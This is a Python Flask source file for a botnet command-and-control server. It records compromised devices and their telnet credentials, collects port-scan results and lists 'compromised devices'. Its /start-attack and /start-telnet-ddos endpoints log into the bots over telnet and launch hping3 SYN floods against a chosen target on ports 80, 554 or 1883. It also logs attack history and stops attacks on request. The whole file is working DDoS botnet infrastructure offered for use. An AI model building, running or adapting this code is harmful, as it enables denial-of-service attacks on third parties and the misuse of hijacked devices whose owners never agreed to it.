# C2 server main application
from flask import Flask, request, jsonify
import logging
import threading
import time
from datetime import datetime
import os

# Import our modules
from .db_manager import DatabaseManager
from .tn_manager import TelnetManager
from .web_ui import render_dashboard, handle_bot_checkin

# Configure logging
log_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'c2_server.log')
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler(log_file)
    ]
)

app = Flask(__name__)

# Initialize managers
db_manager = DatabaseManager('c2_database.db')
telnet_manager = TelnetManager()

# Global state
active_attacks = {}
attack_lock = threading.Lock()

def get_active_sessions():
    """Get count of active telnet sessions"""
    with attack_lock:
        return len(active_attacks)

@app.route('/')
def index():
    """Render main dashboard"""
    bots = db_manager.get_all_devices()
    scan_results = db_manager.get_latest_scan_results()
    active_sessions = get_active_sessions()
    return render_dashboard(bots, scan_results, active_sessions)

@app.route('/bot-checkin', methods=['POST'])
def bot_checkin():
    """Handle bot check-in requests"""
    return handle_bot_checkin(db_manager, request.json)
    
@app.route('/register', methods=['POST'])
def register_device():
    """Alias for device registration (same as bot-checkin)"""
    try:
        data = request.json
        if not data:
            logging.error("No data provided in register request")
            return jsonify({'error': 'No data provided'}), 400
            
        ip = data.get('ip')
        username = data.get('username') 
        password = data.get('password')
        device_type = data.get('device_type', 'unknown')
        
        if not all([ip, username, password]):
            logging.error("Missing required fields in register request")
            return jsonify({'error': 'Missing required fields: ip, username, password'}), 400

        logging.info(f"Registering device: IP={ip}, Username={username}, Type={device_type}")
          # Convert to bot-checkin format
        bot_data = {
            'bot_ip': ip,
            'username': username,
            'password': password,
            'device_type': device_type,
            'status': 'online'
        }
        
        success = db_manager.add_or_update_device(ip, username, password, device_type)
        if success:
            logging.info(f"[SUCCESS] Successfully registered device {ip}")
            return jsonify({'status': 'success', 'message': f'Device {ip} registered successfully'})
        else:
            logging.error(f"[FAIL] Failed to register device {ip}")
            return jsonify({'error': 'Failed to register device'}), 500
            
    except Exception as e:
        logging.error(f"Error in register: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/add-scan-result', methods=['POST'])
def add_scan_result():
    """Add a new scan result to the database"""
    try:
        data = request.json
        if not data:
            logging.error("No data provided in add-scan-result request")
            return jsonify({'error': 'No data provided'}), 400
            
        ip = data.get('ip')
        port = data.get('port')
        service = data.get('service')
        
        if not all([ip, port, service]):
            logging.error("Missing required fields in add-scan-result request")
            return jsonify({'error': 'Missing required fields'}), 400
            
        logging.info(f"Adding scan result: IP={ip}, Port={port}, Service={service}")
        
        success = db_manager.add_scan_result(ip, port, service)
        if success:
            logging.info(f"[SUCCESS] Successfully added scan result for {ip}:{port} ({service})")
            return jsonify({'status': 'success', 'message': 'Scan result added successfully'})
        else:
            logging.error(f"[FAIL] Failed to add scan result for {ip}:{port}")
            return jsonify({'error': 'Failed to add scan result'}), 500
            
    except Exception as e:
        logging.error(f"Error in add-scan-result: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/scan-result', methods=['POST'])
def scan_result():
    """Alias for adding scan results (same as add-scan-result)"""
    try:
        data = request.json
        if not data:
            logging.error("No data provided in scan-result request")
            return jsonify({'error': 'No data provided'}), 400
            
        ip = data.get('ip')
        port = data.get('port')
        service = data.get('service')
        state = data.get('state', 'open')  # Default to 'open' if not provided
        
        if not all([ip, port, service]):
            logging.error("Missing required fields in scan-result request")
            return jsonify({'error': 'Missing required fields: ip, port, service'}), 400

        logging.info(f"Adding scan result: IP={ip}, Port={port}, Service={service}, State={state}")
        
        success = db_manager.add_scan_result(ip, port, service, state)
        
        if success:
            logging.info(f"[SUCCESS] Successfully added scan result for {ip}:{port} ({service}) - {state}")
            return jsonify({'status': 'success', 'message': 'Scan result added successfully'})
        else:
            logging.error(f"[FAIL] Failed to add scan result for {ip}:{port}")
            return jsonify({'error': 'Failed to add scan result'}), 500
            
    except Exception as e:
        logging.error(f"Error in scan-result: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/get-scan-results', methods=['GET'])
def get_scan_results():
    """Get scan results from the database"""
    try:
        results = db_manager.get_latest_scan_results(limit=100)
        return jsonify(results)
    except Exception as e:
        logging.error(f"Error retrieving scan results: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/get-compromised-devices', methods=['GET'])
def get_compromised_devices():
    """Get list of compromised devices"""
    try:
        devices = db_manager.get_all_devices()
        return jsonify(devices)
    except Exception as e:
        logging.error(f"Error retrieving compromised devices: {e}")
        return jsonify({'error': str(e)}), 500
        
@app.route('/start-attack', methods=['POST'])
def start_attack():
    """Start attack on a single device"""
    try:
        data = request.json
        if not data:
            logging.error("No data provided in start-attack request")
            return jsonify({'error': 'No data provided'}), 400
            
        bot_ip = data.get('bot_ip')
        target = data.get('target')
        attack_type = data.get('attack_type')

        if not all([bot_ip, target, attack_type]):
            missing = []
            if not bot_ip: missing.append('bot_ip')
            if not target: missing.append('target')
            if not attack_type: missing.append('attack_type')
            return jsonify({'error': f'Missing required parameters: {", ".join(missing)}'}), 400

        if attack_type not in ['syn', 'rtsp', 'mqtt']:
            return jsonify({'error': f'Invalid attack type: {attack_type}. Must be one of: syn, rtsp, mqtt'}), 400

        # Get device credentials
        device = db_manager.get_device(bot_ip)
        if not device:
            logging.error(f"Device not found in database: {bot_ip}")
            return jsonify({'error': f'Device not found: {bot_ip}'}), 404
            
        # Extract credentials from device record
        try:
            username = device['username']
            password = device['password']
            if not username or not password:
                logging.error(f"Device has invalid credentials: {bot_ip}")
                return jsonify({'error': f'Device has invalid credentials: {bot_ip}'}), 400
        except (KeyError, TypeError) as e:
            logging.error(f"Invalid device data structure for {bot_ip}: {str(e)}")
            return jsonify({'error': f'Invalid device data structure: {str(e)}'}), 500

        # Prepare attack command based on type
        if attack_type == 'syn':
            cmd = f"hping3 -S -p 80 -c 1000 {target}"
        elif attack_type == 'rtsp':
            cmd = f"hping3 -S -p 554 -c 1000 {target}"
        else:  # mqtt
            cmd = f"hping3 -S -p 1883 -c 1000 {target}"

        # Execute attack via telnet
        logging.info(f"Attempting to execute telnet attack from {bot_ip} to {target} using {attack_type}")
        session = telnet_manager.execute_telnet_login_and_send(
            bot_ip, username, password, cmd
        )

        if session:
            with attack_lock:
                active_attacks[bot_ip] = {
                    'target': target,
                    'type': attack_type,
                    'start_time': datetime.now(),
                    'session': session
                }
            logging.info(f"[SUCCESS] Started {attack_type} attack from {bot_ip} to {target}")
            return jsonify({
                'status': 'success', 
                'message': f'Attack started successfully from {bot_ip} to {target}',
                'attack_type': attack_type
            })
        else:
            logging.error(f"Failed to establish telnet connection to {bot_ip}")
            return jsonify({'error': f'Failed to establish telnet connection to {bot_ip}'}), 500

    except Exception as e:
        logging.error(f"Error starting attack: {e}")
        return jsonify({'error': f'Internal server error: {str(e)}'}), 500

@app.route('/stop-attack', methods=['POST'])
def stop_attack():
    """Stop attack on a single device"""
    try:
        data = request.json
        bot_ip = data.get('bot_ip')

        if not bot_ip:
            return jsonify({'error': 'Missing bot IP'}), 400

        with attack_lock:
            if bot_ip in active_attacks:
                session = active_attacks[bot_ip]['session']
                try:
                    # Close the telnet session
                    session.close()
                except Exception as e:
                    logging.error(f"Error closing telnet session for {bot_ip}: {e}")
                
                del active_attacks[bot_ip]
                logging.info(f"Stopped attack from {bot_ip}")
                return jsonify({'message': 'Attack stopped'})
            else:
                return jsonify({'message': 'No active attack found'})

    except Exception as e:
        logging.error(f"Error stopping attack: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/start-telnet-ddos', methods=['POST'])
def start_telnet_ddos():
    """Start DDoS attack on all devices"""
    try:
        data = request.json
        if not data:
            logging.error("No data provided in start-telnet-ddos request")
            return jsonify({'error': 'No data provided'}), 400
            
        target = data.get('target')
        attack_type = data.get('attack_type')

        if not all([target, attack_type]):
            missing = []
            if not target: missing.append('target')
            if not attack_type: missing.append('attack_type')
            return jsonify({'error': f'Missing required parameters: {", ".join(missing)}'}), 400

        if attack_type not in ['syn', 'rtsp', 'mqtt']:
            return jsonify({'error': f'Invalid attack type: {attack_type}. Must be one of: syn, rtsp, mqtt'}), 400

        # Get all online devices
        devices = db_manager.get_online_devices()
        if not devices:
            logging.warning("No online devices available for DDoS attack")
            return jsonify({'error': 'No online devices available'}), 404

        success_count = 0
        successful_ips = []
        failed_ips = {}
        
        for device in devices:
            try:
                # Extract credentials
                if not device or 'ip' not in device or 'username' not in device or 'password' not in device:
                    error_msg = f"Invalid device data structure: {device}"
                    logging.warning(error_msg)
                    failed_ips[device.get('ip', 'unknown')] = error_msg
                    continue
                    
                device_ip = device['ip']
                username = device['username']
                password = device['password']
                
                # Prepare attack command
                if attack_type == 'syn':
                    cmd = f"hping3 -S -p 80 -c 1000 {target}"
                elif attack_type == 'rtsp':
                    cmd = f"hping3 -S -p 554 -c 1000 {target}"
                else:  # mqtt
                    cmd = f"hping3 -S -p 1883 -c 1000 {target}"

                # Execute attack
                logging.info(f"Attempting to start {attack_type} attack from {device_ip} to {target}")
                session = telnet_manager.execute_telnet_login_and_send(
                    device_ip, username, password, cmd
                )

                if session:
                    with attack_lock:
                        active_attacks[device_ip] = {
                            'target': target,
                            'type': attack_type,
                            'start_time': datetime.now(),
                            'session': session
                        }
                    success_count += 1
                    successful_ips.append(device_ip)
                    logging.info(f"[SUCCESS] Started {attack_type} attack from {device_ip} to {target}")
                else:
                    error_msg = f"Failed to establish telnet connection"
                    failed_ips[device_ip] = error_msg
                    logging.warning(f"[FAIL] {error_msg} to {device_ip}")

            except Exception as e:
                error_msg = str(e)
                device_ip = device.get('ip', 'unknown')
                failed_ips[device_ip] = error_msg
                logging.error(f"[FAIL] Error starting attack on {device_ip}: {e}")
                continue

        # Log attack to database for historical tracking
        try:
            db_manager.log_attack(attack_type, target, success_count)
            logging.info(f"Logged attack to database: {attack_type} on {target} with {success_count} devices")
        except Exception as e:
            logging.error(f"Failed to log attack to database: {e}")

        if success_count > 0:
            msg = f"Started {attack_type} attack on {success_count}/{len(devices)} devices against {target}"
            logging.info(msg)
            return jsonify({
                'status': 'success', 
                'message': msg,
                'successful_ips': successful_ips,
                'failed_ips': failed_ips,
                'success_count': success_count,
                'total_devices': len(devices)
            })
        else:
            return jsonify({
                'error': 'Failed to start attacks on any device',
                'failed_ips': failed_ips,
                'total_devices': len(devices)
            }), 500

    except Exception as e:
        logging.error(f"Error in bulk attack: {e}")
        return jsonify({'error': f'Internal server error: {str(e)}'}), 500

@app.route('/stop-telnet-ddos', methods=['POST'])
def stop_telnet_ddos():
    """Stop all active attacks"""
    try:
        with attack_lock:
            if not active_attacks:
                logging.info("No active attacks to stop")
                return jsonify({'message': 'No active attacks', 'stopped_count': 0})

            # Prepare result statistics
            stopped_count = 0
            errors = {}
            stopped_ips = []
            
            # Close all sessions
            for bot_ip, attack_info in list(active_attacks.items()):
                try:
                    session = attack_info['session']
                    if session:
                        session.close()
                        stopped_count += 1
                        stopped_ips.append(bot_ip)
                        logging.info(f"[SUCCESS] Stopped attack from {bot_ip}")
                except Exception as e:
                    error_msg = str(e)
                    errors[bot_ip] = error_msg
                    logging.error(f"[FAIL] Error closing session for {bot_ip}: {e}")

            # Clear active attacks
            active_attacks.clear()
            
            # Update attack status in database
            db_update_count = db_manager.update_attack_status(status='stopped')
            
            # Compose response
            response_data = {
                'message': f'Stopped {stopped_count} active attacks',
                'stopped_count': stopped_count,
                'stopped_ips': stopped_ips,
                'database_updates': db_update_count
            }
            
            if errors:
                response_data['errors'] = errors
                
            logging.info(f"Stopped all active attacks ({stopped_count} total)")
            return jsonify(response_data)

    except Exception as e:
        logging.error(f"Error stopping all attacks: {e}")
        return jsonify({'error': str(e), 'stopped_count': 0}), 500

@app.route('/get-attack-history', methods=['GET'])
def get_attack_history():
    """Get attack history from the database"""
    try:
        limit = request.args.get('limit', default=20, type=int)
        history = db_manager.get_attack_history(limit=limit)
        
        # Format timestamps for better readability
        for entry in history:
            if 'start_time' in entry and entry['start_time']:
                try:
                    # Convert SQLite timestamp string to datetime
                    dt = datetime.fromisoformat(entry['start_time'].replace('Z', '+00:00'))
                    # Format as a readable string
                    entry['start_time'] = dt.strftime('%Y-%m-%d %H:%M:%S')
                except Exception as e:
                    logging.warning(f"Error formatting timestamp: {e}")
        
        return jsonify(history)
    except Exception as e:
        logging.error(f"Error retrieving attack history: {e}")
        return jsonify({'error': str(e)}), 500

@app.errorhandler(404)
def page_not_found(e):
    """Handle 404 errors"""
    logging.warning(f"404 error: {request.path}")
    return jsonify({
        'error': 'Endpoint not found',
        'path': request.path,        'available_endpoints': [
            '/', '/bot-checkin', '/register', '/add-scan-result', '/scan-result',
            '/get-scan-results', '/get-compromised-devices',
            '/start-attack', '/stop-attack',
            '/start-telnet-ddos', '/stop-telnet-ddos',
            '/get-attack-history'
        ]
    }), 404

@app.errorhandler(500)
def server_error(e):
    """Handle 500 errors"""
    logging.error(f"Server error: {str(e)}")
    return jsonify({
        'error': 'Internal server error',
        'message': str(e)
    }), 500

@app.errorhandler(Exception)
def handle_exception(e):
    """Handle unhandled exceptions"""
    logging.error(f"Unhandled exception: {str(e)}", exc_info=True)
    return jsonify({
        'error': 'Unexpected error',
        'message': str(e)
    }), 500

def cleanup_inactive_sessions():
    """Periodically clean up inactive sessions"""
    while True:
        try:
            with attack_lock:
                if not active_attacks:
                    # No active attacks to clean up
                    time.sleep(300)  # Sleep for 5 minutes
                    continue
                    
                current_time = datetime.now()
                to_remove = []
                cleanup_errors = {}

                logging.info(f"Running session cleanup - checking {len(active_attacks)} active sessions")
                
                for bot_ip, attack_info in list(active_attacks.items()):
                    try:
                        # Check if the session exists and is valid
                        if 'session' not in attack_info or not attack_info['session']:
                            logging.info(f"Cleaning up invalid session for {bot_ip} (no session object)")
                            to_remove.append(bot_ip)
                            continue

                        # Remove sessions older than 1 hour
                        if (current_time - attack_info['start_time']).total_seconds() > 3600:
                            try:
                                session = attack_info['session']
                                if session:
                                    session.close()
                                to_remove.append(bot_ip)
                                logging.info(f"Cleaned up expired attack session for {bot_ip} (>1 hour old)")
                            except Exception as e:
                                error_msg = str(e)
                                cleanup_errors[bot_ip] = error_msg
                                logging.error(f"Error closing expired session for {bot_ip}: {e}")
                                # Still mark for removal even if close fails
                                to_remove.append(bot_ip)
                                
                        # Try to check if the session is still alive by checking socket
                        else:
                            try:
                                session = attack_info['session']
                                # This will raise an exception if the connection is dead
                                if hasattr(session, 'sock') and session.sock:
                                    is_alive = bool(session.sock.getpeername())
                                    if not is_alive:
                                        logging.info(f"Cleaning up dead session for {bot_ip} (socket check failed)")
                                        to_remove.append(bot_ip)
                            except Exception as e:
                                # Any exception here means the connection is dead
                                logging.info(f"Cleaning up dead session for {bot_ip} (socket error: {str(e)})")
                                to_remove.append(bot_ip)
                    except Exception as e:
                        logging.error(f"Error checking session for {bot_ip}: {e}")
                        # If we can't even check it, mark it for removal
                        to_remove.append(bot_ip)

                # Remove all marked sessions
                removed_count = 0
                for bot_ip in to_remove:
                    del active_attacks[bot_ip]
                    removed_count += 1
                    
                if removed_count > 0:
                    logging.info(f"Session cleanup completed: removed {removed_count} sessions")
                    
                    # Update database to mark these attacks as stopped
                    try:
                        db_manager.update_attack_status(status='expired')
                    except Exception as e:
                        logging.error(f"Error updating attack logs during cleanup: {e}")

        except Exception as e:
            logging.error(f"Error in cleanup thread: {e}")

        # Sleep for 5 minutes before next cleanup
        time.sleep(300)

if __name__ == '__main__':
    # Start cleanup thread
    cleanup_thread = threading.Thread(target=cleanup_inactive_sessions, daemon=True)
    cleanup_thread.start()

    # Start Flask server
    app.run(host='0.0.0.0', port=5000, debug=False)
